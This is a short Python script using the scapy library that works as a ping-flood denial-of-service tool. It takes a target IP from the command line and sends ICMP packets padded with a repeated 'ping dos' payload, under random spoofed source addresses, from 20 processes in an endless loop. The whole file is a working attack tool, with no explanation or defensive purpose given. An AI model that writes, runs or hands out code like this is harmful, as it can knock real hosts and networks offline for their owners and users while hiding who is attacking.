import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import multiprocessing
from random import randint
from scapy.all import *

# Set target ip
host = sys.argv[1]

# Set ping times
times = 10000

def Random_Section():
     section = random.randint(1,254)
     return section

def Random_IP():
    IP = str(Random_Section())+'.'+str(Random_Section())+'.'+str(Random_Section())+'.'+str(Random_Section())
    return IP

# Sending data based on Ethernet protocol
def ping_send(host, random_source=True):
    # Randomly generate IP-ID
    id_ip = randint(1,65535)
    # Randomly generate Ping-ID
    id_ping = randint(1,65535)
    # Randomly generate Ping-Seq
    seq_ping = randint(1,65535)

    if random_source ==True:
        source_ip = Random_IP()

        ip_proto = IP(src = source_ip,
                        dst = host,
                        ttl = 1,
                        id = id_ip)
    else:
        ip_proto = IP(dst = host,
                        ttl = 1,
                        id = id_ip)

    icmp_proto = ICMP(id = id_ping,
                    seq = seq_ping)

    pkt = ip_proto / icmp_proto / b'ping dos' *100
    send(pkt)

# Send {times} times
def ping_times(host, random_source=True):
    for i in range(times+1):
        ping_send(host, random_source)

#
def ping_concurrent(host, processes=20, random_source=True):
    pool = multiprocessing.Pool(processes=processes)
    while True:
        try:
            pool.apply_async(ping_times,
                                (host, random_source))
        except KeyboardInterrupt:
            pool.terminate()

if __name__ == "__main__":
    ping_concurrent(host)